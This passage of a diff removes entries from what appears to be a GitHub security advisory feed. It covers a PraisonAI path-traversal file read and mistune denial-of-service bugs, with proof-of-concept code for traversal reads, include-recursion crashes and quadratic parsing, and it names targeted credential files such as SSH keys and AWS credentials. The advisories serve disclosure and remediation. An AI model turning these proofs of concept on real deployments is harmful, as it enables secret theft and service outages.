-<p>The proper fix is a delimiter-stack pass, the same approach the formatting-plugin advisory and the bracket-bomb advisory recommend. All three DoS findings share the same algorithmic pattern; a single rewrite of the inline-token retry loop closes them together. Add a regression test asserting that <code>md('**x**' * 50_000)</code> completes in under 1 second.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/lepture/mistune/security/advisories/GHSA-4j32-57v6-6g45">https://github.com/lepture/mistune/security/advisories/GHSA-4j32-57v6-6g45</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-59925">https://nvd.nist.gov/vuln/detail/CVE-2026-59925</a></li>
-<li><a href="https://github.com/lepture/mistune/commit/5de41fb8e527004dbc363e047a3c380c9288c74f">https://github.com/lepture/mistune/commit/5de41fb8e527004dbc363e047a3c380c9288c74f</a></li>
-<li><a href="https://github.com/lepture/mistune/releases/tag/v3.3.0">https://github.com/lepture/mistune/releases/tag/v3.3.0</a></li>
-<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/mistune/PYSEC-2026-2213.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/mistune/PYSEC-2026-2213.yaml</a></li>
-<li><a href="https://github.com/advisories/GHSA-4j32-57v6-6g45">https://github.com/advisories/GHSA-4j32-57v6-6g45</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-4j32-57v6-6g45</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-07-20T21:32:40.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[praisonaiagents] PraisonAI: Arbitrary File Read via `@file:` Mention Path Traversal]]></title>
-        <id>https://github.com/advisories/GHSA-2rcg-mm5h-xchx</id>
-        <link href="https://github.com/advisories/GHSA-2rcg-mm5h-xchx"/>
-        <updated>2026-07-20T21:26:30.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
-<p>The MentionsParser in <code>src/praisonai-agents/praisonaiagents/tools/mentions.py</code> processes <code>@file:</code> mentions in agent prompts by reading arbitrary files from the filesystem. When a file path is not found relative to the workspace, the parser falls back to using the path as an absolute path without any validation or boundary check. This allows an attacker who can influence agent prompts (via chat messages, Telegram/Discord/Slack bot inputs, or YAML workflow configs) to read any file on the filesystem accessible to the process user.</p>
-<h2 id="details">Details</h2>
-<p><strong>Vulnerable code (lines 165–178):</strong></p>
-<pre><code class="language-python">def _process_file_mention(self, file_path: str) -&gt; Optional[str]:
-    """Process @file:path mention."""
-    try:
-        # Resolve path relative to workspace
-        full_path = self.workspace_path / file_path
-        if not full_path.exists():
-            # Try as absolute path
-            full_path = Path(file_path)
-        
-        if not full_path.exists():
-            self._log(f"File not found: {file_path}", logging.WARNING)
-            return f"# File: {file_path}\n[File not found]"
-        
-        content = full_path.read_text(encoding="utf-8")
-</code></pre>
-<p><strong>The vulnerability is in the fallback at line 171–172:</strong> When the file is not found relative to <code>workspace_path</code>, the code constructs <code>full_path = Path(file_path)</code>, which accepts any absolute or relative path without validation. There is no:</p>
-<ul>
-<li><code>..</code> path traversal check</li>
-<li>Workspace boundary validation</li>
-<li>Symlink resolution against workspace</li>
-<li>Protected path guard</li>
-</ul>
-<p>The <code>file_path</code> parameter originates from parsing <code>@file:</code> mentions in user/LLM prompts. The <code>MentionsParser</code> is used across the framework to process mentions in agent instructions and user messages.</p>
-<p><strong>Contrast with <code>skill_tools.py</code> <code>read_skill_file</code></strong> (lines 140–193), which properly validates:</p>
-<pre><code class="language-python"># skill_tools.py line 179 — proper validation
-if os.path.commonpath([full_path, skill_path]) != skill_path:
-    return f"Error: Path traversal detected - {file_path} is outside skill directory"
-</code></pre>
-<h2 id="poc">PoC</h2>
-<p><strong>Setup:</strong> Clean checkout at commit <code>d5f1114a</code>.</p>
-<p><strong>Positive trigger — arbitrary file read via @file: mention:</strong></p>
-<pre><code class="language-python">import sys
-sys.path.insert(0, 'src/praisonai-agents')
-from praisonaiagents.tools.mentions import MentionsParser
-
-parser = MentionsParser()
-
-# Test 1: Absolute path read (bypasses workspace resolution)
-result = parser._process_file_mention('/etc/hostname')
-print(f'Absolute path read: {result[:80]}...')
-
-# Test 2: Relative path with traversal
-result = parser._process_file_mention('../../../etc/hostname')
-print(f'Traversal read: {result[:80]}...')
-</code></pre>
-<p><strong>Expected output:</strong></p>
-<pre><code>Absolute path read: # File: /etc/hostname
-```linux
-&lt;hostname&gt;
-```...
-Traversal read: # File: ../../../etc/hostname
-```linux
-&lt;hostname&gt;
-```...
-</code></pre>
-<p><strong>Negative control — non-existent file:</strong></p>
-<pre><code class="language-python">result = parser._process_file_mention('/nonexistent/secret.txt')
-# Returns: "# File: /nonexistent/secret.txt\n[File not found]"
-</code></pre>
-<p><strong>Cleanup:</strong> No persistence or side effects — read-only operation.</p>
-<h2 id="impact">Impact</h2>
-<p>An attacker who can inject <code>@file:</code> mentions into agent prompts (via chat messages in Telegram/Discord/Slack bots, user input in web UI, or YAML workflow configurations) can read any file accessible to the process user, including:</p>
-<ul>
-<li><strong>Secrets and credentials:</strong> <code>.env</code> files, <code>~/.aws/credentials</code>, <code>~/.ssh/id_rsa</code>, API keys</li>
-<li><strong>Configuration files:</strong> Database passwords, JWT secrets, OAuth tokens</li>
-<li><strong>Source code:</strong> Application internals, database schemas</li>
-<li><strong>System files:</strong> <code>/etc/passwd</code>, <code>/etc/shadow</code> (if process has read access)</li>
-</ul>
-<p>This is particularly dangerous in bot deployments where <code>auto_approve_tools</code> defaults to <code>True</code> and untrusted users can send messages containing <code>@file:</code> mentions.</p>
-<h2 id="suggested-remediation">Suggested remediation</h2>
-<ol>
-<li><strong>Remove the absolute path fallback.</strong> Only resolve files within <code>workspace_path</code>:</li>
-</ol>
-<pre><code class="language-python">def _process_file_mention(self, file_path: str) -&gt; Optional[str]:
-    full_path = (self.workspace_path / file_path).resolve()
-    # Ensure resolved path is within workspace
-    if not str(full_path).startswith(str(self.workspace_path.resolve())):
-        return f"# File: {file_path}\n[Access denied: path outside workspace]"
-    if not full_path.exists():
-        return f"# File: {file_path}\n[File not found]"
-    content = full_path.read_text(encoding="utf-8")
-</code></pre>
-<ol start="2">
-<li><p>Add symlink resolution via <code>.resolve()</code> to prevent symlink-based traversal.</p>
-</li>
-<li><p>Add a protected path guard (<code>.env</code>, <code>.git</code>, <code>.ssh</code>, keys, credentials).</p>
-</li>
-<li><p>Apply the same <code>os.path.commonpath</code> pattern used by <code>skill_tools.py</code>.</p>
-</li>
-</ol>
-<h3 id="credits">Credits</h3>
-<ul>
-<li>Thai Son Dinh from VinSOC Labs (R&amp;D)</li>
-</ul>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/MervinPraison/PraisonAI/security/advisories/GHSA-2rcg-mm5h-xchx">https://github.com/MervinPraison/PraisonAI/security/advisories/GHSA-2rcg-mm5h-xchx</a></li>
-<li><a href="https://github.com/advisories/GHSA-2rcg-mm5h-xchx">https://github.com/advisories/GHSA-2rcg-mm5h-xchx</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-2rcg-mm5h-xchx</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-06-18T13:57:00.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[mistune] Mistune directives/include: mutual `.. include::` recursion crashes the renderer with `RecursionError`, denial of service via two attacker-controlled markdown files]]></title>
-        <id>https://github.com/advisories/GHSA-8mpj-m6qm-5qr8</id>
-        <link href="https://github.com/advisories/GHSA-8mpj-m6qm-5qr8"/>
-        <updated>2026-07-20T21:24:43.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
-<p><strong>Type:</strong> Uncontrolled recursion via mutual include. The <code>Include</code> directive checks for direct self-reference (<code>a.md</code> cannot include <code>a.md</code>), but does not detect indirect cycles. Two markdown files that include each other (<code>a.md</code> → includes <code>b.md</code> → includes <code>a.md</code>) cause unbounded recursion until Python's stack limit fires <code>RecursionError</code>. The exception propagates out of the renderer and crashes the calling code.
-<strong>File:</strong> <code>src/mistune/directives/include.py</code>, lines 33-37 (the self-include check is the only cycle-detection logic).
-<strong>Root cause:</strong> the include logic only compares <code>os.path.abspath(dest) == os.path.abspath(source_file)</code>. There is no per-render set of "files already included" that would catch transitive cycles. When <code>a.md</code> includes <code>b.md</code>, the recursive <code>block.parse(new_state)</code> call uses <code>dest</code> (b.md) as the new <code>__file__</code>, which then includes <code>a.md</code> (passing the self-check, because the immediate parent file is <code>b.md</code>, not <code>a.md</code>), which then includes <code>b.md</code>, and so on. Each recursion level adds Python frames; the default stack limit of 1000 frames trips after ~7-10 cycle iterations and Python raises <code>RecursionError</code>. Since the directive does not catch the exception, it propagates out of <code>Markdown.parse()</code> and surfaces in the calling code, crashing the request.</p>
-<h2 id="affected-code">Affected Code</h2>
-<p><strong>File:</strong> <code>src/mistune/directives/include.py</code>, lines 28-54.</p>
-<pre><code class="language-python">relpath = self.parse_title(m)
-dest = os.path.join(os.path.dirname(source_file), relpath)
-dest = os.path.normpath(dest)
-
-if os.path.abspath(dest) == os.path.abspath(source_file):       # &lt;-- only catches direct self-include
-    return {"type": "block_error", "raw": "Could not include self: " + relpath}
-
-if not os.path.isfile(dest):
-    return {"type": "block_error", "raw": "Could not find file: " + relpath}
-
-with open(dest, "rb") as f:
-    content = f.read().decode(encoding)
-
-ext = os.path.splitext(relpath)[1]
-if ext in {".md", ".markdown", ".mkd"}:
-    new_state = block.state_cls()
-    new_state.env["__file__"] = dest
-    new_state.process(content)
-    block.parse(new_state)                                       # &lt;-- recursive parse, no cycle tracking
-    return new_state.tokens
-</code></pre>
-<p><strong>Why it's wrong:</strong> the cycle-detection check is one level deep. Multi-file cycles slip through trivially. Python's default recursion limit is 1000 frames, so a cycle of length 2 trips after a few hundred mutual includes; the exception is uncaught by the directive, propagating out of <code>Markdown.__call__()</code> and crashing whatever called it.</p>
-<h2 id="exploit-chain">Exploit Chain</h2>
-<ol>
-<li>Application uses mistune with the <code>Include</code> directive enabled. Application accepts user-supplied markdown files (CMS, wiki, multi-user documentation platform, note-taking app, CI/CD doc renderer).</li>
-<li>Attacker uploads two markdown files:<ul>
-<li><code>a.md</code>: <code>.. include:: b.md</code></li>
-<li><code>b.md</code>: <code>.. include:: a.md</code></li>
-</ul>
-</li>
-<li>Renderer is invoked on <code>a.md</code> (or any markdown that references this pair). <code>Include</code> directive includes <code>b.md</code>, which includes <code>a.md</code>, which includes <code>b.md</code>, ... Each recursion adds Python frames.</li>
-<li>After ~340 cycle iterations (depending on default <code>sys.setrecursionlimit(1000)</code> and the per-include frame depth), Python raises <code>RecursionError: maximum recursion depth exceeded</code>.</li>
-<li>The exception is not caught by the directive. It propagates through <code>block.parse</code>, through <code>Markdown.__call__</code>, and into the application's request handler. If the application doesn't catch it explicitly, the request errors out (HTTP 500 in web contexts, crash in CLI tools).</li>
-</ol>
-<h2 id="security-impact">Security Impact</h2>
-<p><strong>Attacker capability:</strong> crash the rendering engine on demand by submitting any markdown that triggers the cycle. Repeated requests deny service. If the renderer is used in a hot path (per-page-view docs rendering, search-index regeneration, scheduled doc-export jobs), the cycle persists across the whole pipeline.
-<strong>Preconditions:</strong> application uses mistune with the <code>Include</code> directive enabled and renders user-supplied markdown that can reference other user-uploaded files. Attacker needs write access to two .md files in the include search path (or a single file including a known-recurring pair).
-<strong>Differential:</strong> PoC-verified against <a href="mailto:mistune@3.2.1">mistune@3.2.1</a>:</p>
-<pre><code class="language-python">import os, mistune
-from mistune.directives import RSTDirective, Include
-
-os.makedirs('/tmp/mistune-recur', exist_ok=True)
-with open('/tmp/mistune-recur/a.md', 'w') as f:
-    f.write('A\n\n.. include:: b.md')
-with open('/tmp/mistune-recur/b.md', 'w') as f:
-    f.write('B\n\n.. include:: a.md')
-
-md = mistune.create_markdown(plugins=[RSTDirective([Include()])])
-state = md.block.state_cls()
-state.env['__file__'] = '/tmp/mistune-recur/a.md'
-md.parse('.. include:: b.md', state=state)
-# RecursionError: maximum recursion depth exceeded
-</code></pre>
-<p>The patched build (with the suggested fix below) returns a <code>block_error</code> token like the existing self-include check, instead of recursing forever.</p>
-<h2 id="suggested-fix">Suggested Fix</h2>
-<p>Track included paths in <code>state.env</code> and reject any include that would re-enter a path already on the include stack:</p>
-<pre><code class="language-diff">--- a/src/mistune/directives/include.py
-+++ b/src/mistune/directives/include.py
-@@ -28,8 +28,18 @@ class Include(DirectivePlugin):
-         relpath = self.parse_title(m)
--        dest = os.path.join(os.path.dirname(source_file), relpath)
--        dest = os.path.normpath(dest)
-+        base = os.path.realpath(os.path.dirname(source_file))
-+        dest = os.path.realpath(os.path.join(base, relpath))
-+
-+        # Track include stack across recursive parses to detect cycles.
-+        include_stack = state.env.setdefault("__include_stack__", [])
-+        if dest in include_stack or dest == os.path.realpath(source_file):
-+            return {
-+                "type": "block_error",
-+                "raw": "Could not include (cycle): " + relpath,
-+            }
-
--        if os.path.abspath(dest) == os.path.abspath(source_file):
--            return {
--                "type": "block_error",
--                "raw": "Could not include self: " + relpath,
--            }
-@@ ... in the markdown-include branch ...
-+        include_stack.append(dest)
-+        try:
-+            new_state = block.state_cls()
-+            new_state.env["__file__"] = dest
-+            new_state.env["__include_stack__"] = include_stack
-+            new_state.process(content)
-+            block.parse(new_state)
-+            return new_state.tokens
-+        finally:
-+            include_stack.pop()
-</code></pre>
-<p>This catches cycles of any length (<code>a → b → a</code>, <code>a → b → c → a</code>, etc.). Pair this with the path-containment fix from the LFI advisory and the HTML-extension fix from the include-XSS advisory; together those three patches make the <code>Include</code> directive safe to enable on user-supplied markdown.</p>
-<p>Add a regression test asserting that a 2-cycle and a 3-cycle both produce <code>block_error</code> rather than <code>RecursionError</code>.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/lepture/mistune/security/advisories/GHSA-8mpj-m6qm-5qr8">https://github.com/lepture/mistune/security/advisories/GHSA-8mpj-m6qm-5qr8</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-59927">https://nvd.nist.gov/vuln/detail/CVE-2026-59927</a></li>
-<li><a href="https://github.com/lepture/mistune/commit/1bef343ade163fc3bb95572b15be720084cdb993">https://github.com/lepture/mistune/commit/1bef343ade163fc3bb95572b15be720084cdb993</a></li>
-<li><a href="https://github.com/lepture/mistune/releases/tag/v3.3.0">https://github.com/lepture/mistune/releases/tag/v3.3.0</a></li>
-<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/mistune/PYSEC-2026-2215.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/mistune/PYSEC-2026-2215.yaml</a></li>
-<li><a href="https://github.com/advisories/GHSA-8mpj-m6qm-5qr8">https://github.com/advisories/GHSA-8mpj-m6qm-5qr8</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-8mpj-m6qm-5qr8</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-07-20T21:24:42.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[mistune] Mistune block_parser: quadratic-time parsing on long lists of repeated reference-link definitions]]></title>
-        <id>https://github.com/advisories/GHSA-ffq3-xpv3-j92q</id>
-        <link href="https://github.com/advisories/GHSA-ffq3-xpv3-j92q"/>
-        <updated>2026-07-20T21:24:20.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
-<p><strong>Type:</strong> Algorithmic-complexity DoS in reference-link definition handling. A markdown document with N reference-link definitions of the same key (or many distinct keys) takes O(N²) parser time. 5000 repeated <code>[a]: u\n</code> definitions take ~1.1 second; 10000 → ~4.5 seconds.
-<strong>File:</strong> <code>src/mistune/block_parser.py</code> (reference-link def parsing) and the surrounding <code>ref_links</code> env-dictionary handling.
-<strong>Root cause:</strong> every reference definition is parsed by scanning forward from each candidate position. The <code>unikey</code> normalisation runs per-def, the dictionary insert is per-def, and the lookup-by-label-then-iterate-defs path is linear in the number of stored defs. For input with N defs, the total work is O(N²).</p>
-<h2 id="affected-code">Affected Code</h2>
-<p><code>src/mistune/block_parser.py</code> — reference-definition rule fires on every line that matches <code>[label]: url</code>. For each one:</p>
-<ul>
-<li><code>unikey(label)</code> is called (linear scan of the label).</li>
-<li>The def is appended to <code>state.env['ref_links']</code>.</li>
-<li>Later inline-link resolution looks up by <code>unikey(label)</code> in the dict (O(1)) but the surrounding parser revisits the def list for paragraph-vs-def disambiguation.</li>
-</ul>
-<p>The cumulative parse time grows as the square of the number of defs.</p>
-<p><strong>Why it's wrong:</strong> the parser does not amortise the def-list scan. A single forward pass with a hash-keyed dict (already in place) plus a per-line classifier should make this O(N).</p>
-<h2 id="exploit-chain">Exploit Chain</h2>
-<ol>
-<li>Application uses mistune to render attacker-supplied markdown. No plugins required.</li>
-<li>Attacker submits a 35 KB document of <code>[a]: u\n</code> repeated 5000 times followed by <code>[click][a]</code>.</li>
-<li>CPU pegs for ~1.1 seconds. 10000 defs → ~4.5 s. 20000 → ~18 s. Doubling input quadruples time.</li>
-</ol>
-<h2 id="security-impact">Security Impact</h2>
-<p><strong>Attacker capability:</strong> small input → large CPU. Predictable scaling. Can be repeated.
-<strong>Preconditions:</strong> application uses <code>mistune.create_markdown()</code> (default config) on attacker-supplied markdown. Worth noting: the <code>ref_links</code> dictionary persists for the lifetime of the parse, so a long document with many defs builds up memory; with N defs of attacker-chosen length, the per-def normalisation cost compounds.
-<strong>Differential:</strong> PoC-verified against <a href="mailto:mistune@3.2.1">mistune@3.2.1</a>, default config:</p>
-<pre><code class="language-python">import mistune, time
-md = mistune.create_markdown()
-for n in [1000, 2000, 5000, 10000]:
-    s = '[a]: u\n' * n + '[click][a]'
-    t = time.time()
-    md(s)
-    print(f'  ref defs * {n} ({len(s)}b): {(time.time() - t) * 1000:.0f}ms')
-
-# Output (Python 3.13, Linux, 2.5GHz CPU):
-#   ref defs *  1000  ( 7012b):    46ms
-#   ref defs *  2000 (14012b):   186ms
-#   ref defs *  5000 (35012b):  1121ms
-#   ref defs * 10000 (70012b):  4400ms
-</code></pre>
-<p>The patched build (with the surrounding parser amortised to O(N)) keeps the time linear.</p>
-<h2 id="suggested-fix">Suggested Fix</h2>
-<p>Replace the per-def re-scan with a single forward pass that classifies each line into <code>ref_def | paragraph | other</code> once and only inserts into <code>ref_links</code> once per def. The dict already exists; the wasted work is in the surrounding scan loop, not in the dict operations.</p>
-<p>A regression test asserting that <code>md('[a]: u\n' * 50_000 + '[click][a]')</code> completes in under 1 second would catch any regression.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/lepture/mistune/security/advisories/GHSA-ffq3-xpv3-j92q">https://github.com/lepture/mistune/security/advisories/GHSA-ffq3-xpv3-j92q</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-59928">https://nvd.nist.gov/vuln/detail/CVE-2026-59928</a></li>
-<li><a href="https://github.com/lepture/mistune/commit/2b04d7ba341c16ac78fe82d3076bdd5c3de87c69">https://github.com/lepture/mistune/commit/2b04d7ba341c16ac78fe82d3076bdd5c3de87c69</a></li>
-<li><a href="https://github.com/lepture/mistune/releases/tag/v3.3.0">https://github.com/lepture/mistune/releases/tag/v3.3.0</a></li>
-<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/mistune/PYSEC-2026-2216.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/mistune/PYSEC-2026-2216.yaml</a></li>
-<li><a href="https://github.com/advisories/GHSA-ffq3-xpv3-j92q">https://github.com/advisories/GHSA-ffq3-xpv3-j92q</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-ffq3-xpv3-j92q</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-07-20T21:24:18.000Z</published>
     </entry>
 </feed>
